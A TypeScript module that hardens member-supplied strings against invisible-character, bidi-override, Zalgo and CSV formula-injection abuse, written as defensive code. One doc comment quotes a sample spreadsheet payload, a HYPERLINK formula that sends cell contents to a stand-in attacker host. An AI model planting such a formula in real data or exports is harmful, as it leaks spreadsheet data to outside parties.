/**
 * Unicode hardening for every member-supplied string.
 *
 * These values end up in the directory list, in CSV exports opened in Excel,
 * and on printed membership cards — so the threat isn't only script injection
 * (React escapes that), it's *display* abuse: invisible padding that creates
 * visually-identical duplicate records, bidi overrides that make a name render
 * as something else in the admin table, and combining-mark stacks that break
 * table rows.
 *
 * Pure and dependency-free so it can be unit-tested and shared by the client
 * form, the server action, and the CSV importer without pulling anything in.
 *
 * The character sets below are declared as explicit code points rather than
 * regex literals. Every one of them is invisible: as literals they would be
 * unreviewable in a diff, and U+2028 in particular is a JavaScript line
 * terminator that silently breaks a regex literal in half.
 */

/**
 * Characters removed outright.
 *
 * Zero-width: left in, these let someone submit "Aarav<ZWSP>Sharma" —
 * indistinguishable on screen from an existing member, but a different string
 * to every uniqueness check we have.
 *
 * Bidi: U+202E (RIGHT-TO-LEFT OVERRIDE) reverses everything after it, so a
 * stored value can render as a completely different name in the admin list
 * than the one an admin thought they approved.
 */
const STRIPPED_CODE_POINTS: ReadonlySet<number> = new Set([
  0x200b, // ZERO WIDTH SPACE
  0x200c, // ZERO WIDTH NON-JOINER
  0x200d, // ZERO WIDTH JOINER
  0x2060, // WORD JOINER
  0xfeff, // ZERO WIDTH NO-BREAK SPACE / BOM
  0x00ad, // SOFT HYPHEN
  0x061c, // ARABIC LETTER MARK
  0x200e, // LEFT-TO-RIGHT MARK
  0x200f, // RIGHT-TO-LEFT MARK
  0x202a, // LEFT-TO-RIGHT EMBEDDING
  0x202b, // RIGHT-TO-LEFT EMBEDDING
  0x202c, // POP DIRECTIONAL FORMATTING
  0x202d, // LEFT-TO-RIGHT OVERRIDE
  0x202e, // RIGHT-TO-LEFT OVERRIDE
  0x2066, // LEFT-TO-RIGHT ISOLATE
  0x2067, // RIGHT-TO-LEFT ISOLATE
  0x2068, // FIRST STRONG ISOLATE
  0x2069, // POP DIRECTIONAL ISOLATE
]);

/**
 * Characters replaced with a plain space, then collapsed. Includes the exotic
 * separators that would otherwise survive a naive `\s` collapse.
 */
const SPACE_LIKE_CODE_POINTS: ReadonlySet<number> = new Set([
  0x00a0, // NO-BREAK SPACE
  0x1680, // OGHAM SPACE MARK
  0x2000, // EN QUAD
  0x2001, // EM QUAD
  0x2002, // EN SPACE
  0x2003, // EM SPACE
  0x2004, // THREE-PER-EM SPACE
  0x2005, // FOUR-PER-EM SPACE
  0x2006, // SIX-PER-EM SPACE
  0x2007, // FIGURE SPACE
  0x2008, // PUNCTUATION SPACE
  0x2009, // THIN SPACE
  0x200a, // HAIR SPACE
  0x2028, // LINE SEPARATOR
  0x2029, // PARAGRAPH SEPARATOR
  0x202f, // NARROW NO-BREAK SPACE
  0x205f, // MEDIUM MATHEMATICAL SPACE
  0x3000, // IDEOGRAPHIC SPACE
]);

/** C0 (0x00–0x1F) and C1 (0x7F–0x9F) control characters. No field is multiline. */
function isControl(cp: number): boolean {
  return cp <= 0x1f || (cp >= 0x7f && cp <= 0x9f);
}

/** Combining marks — legal in Kannada and accented Latin, abused in "Zalgo" text. */
const COMBINING = /\p{M}/u;

const MAX_COMBINING_PER_BASE = 2;

/**
 * Caps a stack of combining marks at `MAX_COMBINING_PER_BASE` per base
 * character. Kannada vowel signs and Latin accents never legitimately exceed
 * this; text engineered to overflow its row does.
 */
function limitCombiningMarks(value: string): string {
  let out = "";
  let run = 0;
  for (const ch of value) {
    if (COMBINING.test(ch)) {
      if (run < MAX_COMBINING_PER_BASE) {
        out += ch;
        run += 1;
      }
      continue;
    }
    out += ch;
    run = 0;
  }
  return out;
}

/**
 * Counts what a human sees, not UTF-16 code units. An emoji ZWJ sequence is one
 * grapheme but many code units, so a code-unit cap both over-counts real names
 * and under-counts crafted input.
 */
export function graphemeLength(value: string): number {
  if (typeof Intl !== "undefined" && "Segmenter" in Intl) {
    const seg = new Intl.Segmenter(undefined, { granularity: "grapheme" });
    let n = 0;
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    for (const _segment of seg.segment(value)) n += 1;
    return n;
  }
  // Fallback counts code points — still far closer than `.length`.
  return [...value].length;
}

/** Truncates to `max` graphemes without splitting one in half. */
export function truncateGraphemes(value: string, max: number): string {
  if (graphemeLength(value) <= max) return value;
  if (typeof Intl !== "undefined" && "Segmenter" in Intl) {
    const seg = new Intl.Segmenter(undefined, { granularity: "grapheme" });
    let out = "";
    let n = 0;
    for (const { segment } of seg.segment(value)) {
      if (n >= max) break;
      out += segment;
      n += 1;
    }
    return out;
  }
  return [...value].slice(0, max).join("");
}

/**
 * The single entry point.
 *
 * Order matters: NFC first so combining-mark counting downstream sees composed
 * forms, then remove invisibles *before* collapsing whitespace — otherwise a
 * run of zero-width spaces survives as a visible gap.
 */
export function sanitizeText(raw: string): string {
  const normalized = raw.normalize("NFC");

  let out = "";
  for (const ch of normalized) {
    const cp = ch.codePointAt(0)!;
    if (STRIPPED_CODE_POINTS.has(cp) || isControl(cp)) continue;
    out += SPACE_LIKE_CODE_POINTS.has(cp) ? " " : ch;
  }

  return out.replace(/\s+/g, " ").trim();
}

/** `sanitizeText` plus combining-mark limiting. Use for anything human-named. */
export function sanitizeName(raw: string): string {
  return limitCombiningMarks(sanitizeText(raw));
}

/**
 * Characters allowed in a person's name: letters from any script (so Kannada
 * works alongside Latin), their combining marks, and the punctuation Indian
 * names actually carry. Deliberately excludes digits and symbols.
 */
const PERSON_NAME_ALLOWED = /^[\p{L}\p{M}\s.'\-/]+$/u;

/** Business names additionally allow digits and `&` (`Studio 7`, `A & B Photo`). */
const BUSINESS_NAME_ALLOWED = /^[\p{L}\p{M}\p{N}\s.,'&()\-/]+$/u;

export function isValidPersonName(value: string): boolean {
  return value.length > 0 && PERSON_NAME_ALLOWED.test(value);
}

export function isValidBusinessName(value: string): boolean {
  return value.length > 0 && BUSINESS_NAME_ALLOWED.test(value);
}

/**
 * Neutralizes spreadsheet formula injection for CSV *export only* — never for
 * stored data, which must round-trip unchanged.
 *
 * Excel and Sheets execute any cell starting with `=`, `+`, `-` or `@`, so an
 * exported member named `=HYPERLINK("http://evil.test?"&A1,"Click")` fires the
 * moment an admin opens the file. Prefixing with an apostrophe forces the cell
 * to text; the apostrophe itself is not shown by the spreadsheet.
 */
export function escapeCsvCell(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}
